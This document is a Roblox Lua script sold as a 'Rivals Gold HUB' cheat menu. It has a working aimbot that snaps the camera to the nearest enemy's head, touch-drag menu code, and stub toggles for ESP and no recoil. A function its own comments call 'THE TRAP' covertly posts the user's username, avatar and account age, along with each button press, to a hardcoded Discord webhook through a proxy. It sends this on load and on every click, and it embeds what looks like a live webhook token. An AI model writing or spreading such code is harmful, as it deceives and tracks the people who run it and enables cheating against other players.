-- [[ 🥇 RIVALS GOLD HUB - ULTIMATE MOBILE EDITION 🥇 ]] --
-- FULL FEATURES | TOUCH-DRAG | AUTO-LOGGING
-- CEO: YOUSEF

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- [[ 1. WEBHOOK CONFIG (YOURS) ]] --
local WEBHOOK_URL = "https://discord.com/api/webhooks/1489222350682591412/yw1sBcPiGUwiRo3xLxT2X7YStygZ3oNGzwR8dUD9f7NhVB9dLvbbXX5LBFmVM05PlBlW"
local PROXY = "https://hooks.hyra.io/"

-- [[ 2. SENTINEL LOGGER (THE TRAP) ]] --
local function SendLog(moduleName)
    local thumb, _ = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    local data = {
        ["embeds"] = {{
            ["title"] = "🏆 Rivals Gold HUB | Mobile Activity",
            ["color"] = 16766720, -- Gold
            ["thumbnail"] = {["url"] = thumb},
            ["fields"] = {
                {["name"] = "Player", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
                {["name"] = "Action", ["value"] = "```" .. moduleName .. "```", ["inline"] = true},
                {["name"] = "Account Age", ["value"] = "```" .. LocalPlayer.AccountAge .. " days```", ["inline"] = false}
            },
            ["footer"] = {["text"] = "WindowsLacido Cloud Security"}
        }}
    }
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL:gsub("https://discord.com/", PROXY), HttpService:JSONEncode(data))
    end)
end

-- [[ 3. COMBAT LOGIC (AIMBOT & TEAMCHECK) ]] --
_G.Aimbot = false
_G.TeamCheck = true

local function getClosestPlayer()
    local target = nil
    local shortestDist = math.huge
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Head") then
            if _G.TeamCheck and plr.Team == LocalPlayer.Team then continue end
            local pos, onScreen = Camera:WorldToViewportPoint(plr.Character.Head.Position)
            if onScreen then
                local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
                if dist < shortestDist then
                    shortestDist = dist
                    target = plr.Character.Head
                end
            end
        end
    end
    return target
end

RunService.RenderStepped:Connect(function()
    if _G.Aimbot then
        local target = getClosestPlayer()
        if target then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Position)
        end
    end
end)

-- [[ 4. MOBILE UI CONSTRUCTION ]] --
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.Name = "GoldHub_Ultimate"
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 10000

-- Main Menu Frame
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 260, 0, 320)
Main.Position = UDim2.new(0.5, -130, 0.4, -160)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderSizePixel = 0
Main.Active = true

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = UDim.new(0, 15)

local Gradient = Instance.new("UIGradient", Main)
Gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), -- White Gold
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 215, 0))   -- Gold
})
Gradient.Rotation = 90

local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Text = "RIVALS GOLD HUB"
Title.TextColor3 = Color3.white
Title.Font = Enum.Font.GothamBold
Title.BackgroundTransparency = 1
Title.TextSize = 18

-- [[ MOBILE DRAGGING ENGINE ]] --
local dragging, dragStart, startPos
Main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Main.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input) dragging = false end)

-- [[ 5. TOGGLE & BUTTONS ]] --
local ToggleIcon = Instance.new("TextButton", ScreenGui)
ToggleIcon.Size = UDim2.new(0, 45, 0, 45)
ToggleIcon.Position = UDim2.new(0, 10, 0.4, 0)
ToggleIcon.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
ToggleIcon.Text = "🥇"
ToggleIcon.TextSize = 25
Instance.new("UICorner", ToggleIcon).CornerRadius = UDim.new(1, 0)

ToggleIcon.MouseButton1Click:Connect(function()
    Main.Visible = not Main.Visible
end)

local function AddFeature(name, y, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.85, 0, 0, 40)
    btn.Position = UDim2.new(0.075, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    btn.Text = name
    btn.TextColor3 = Color3.white
    btn.Font = Enum.Font.GothamMedium
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    
    btn.MouseButton1Click:Connect(function()
        SendLog(name)
        callback()
    end)
end

AddFeature("🎯 AIMLOCK (HEAD)", 65, function() _G.Aimbot = not _G.Aimbot end)
AddFeature("👁️ ESP BOX (GOLD)", 115, function() print("ESP Toggle") end)
AddFeature("⚡ NO RECOIL", 165, function() print("Recoil Mod") end)
AddFeature("🗑️ UNLOAD HUB", 240, function() ScreenGui:Destroy() end)

-- Finalize
SendLog("SCRIPT EXECUTED")
print("Rivals Gold HUB: Mobile Ultimate Loaded. Check Webhook.")
